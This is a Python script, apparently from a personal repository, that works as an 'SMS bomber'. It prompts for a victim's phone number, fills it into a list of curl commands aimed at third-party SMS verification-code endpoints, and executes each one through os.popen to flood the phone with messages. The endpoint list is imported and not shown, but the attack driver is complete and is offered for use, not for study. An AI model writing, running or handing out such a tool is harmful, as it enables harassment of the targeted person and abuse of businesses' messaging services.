# coding:utf-8

'''
@author = super_fazai
@File    : main.py
@Time    : 2018/4/25 10:49
@connect : superonesfazai@gmail.com
'''

from 常用短信验证码curl接口 import CURL_LIST

import os
import time
import subprocess
from subprocess import STDOUT, check_output

from fzutils.time_utils import fz_set_timeout

def run():
    @fz_set_timeout(5)
    def sms_bomb(cmd):
        try:
            os.popen(cmd).readlines()
            # proc = subprocess.Popen(
            #     cmd,
            #     stderr=subprocess.STDOUT,  # Merge stdout and stderr
            #     stdout=subprocess.PIPE,
            #     shell=True)
            # output = check_output(cmd, stderr=STDOUT, timeout=5)
            # print(output)
        except UnicodeDecodeError:
            print('\nUnicodeDecodeError')
        except Exception as e:
            print(e)

        return

    phone_num = input('请输入你要轰炸的手机号码(以";"结束):')
    phone_num = phone_num.strip(';')

    for index, item in enumerate(CURL_LIST):
        print('开始第 {0} 次轰炸...'.format(index))
        item = str(item.replace('${PHONE_NUM}', '{0}'))
        try:
            cmd = item.format(phone_num)
            print('\n' + cmd)
        except ValueError:
            print('\nValueError')
            continue

        try:
            sms_bomb(cmd)
        except Exception as e:
            print(e)
            print('跳过!')

    print('轰炸完毕!!')

if __name__ == '__main__':
    run()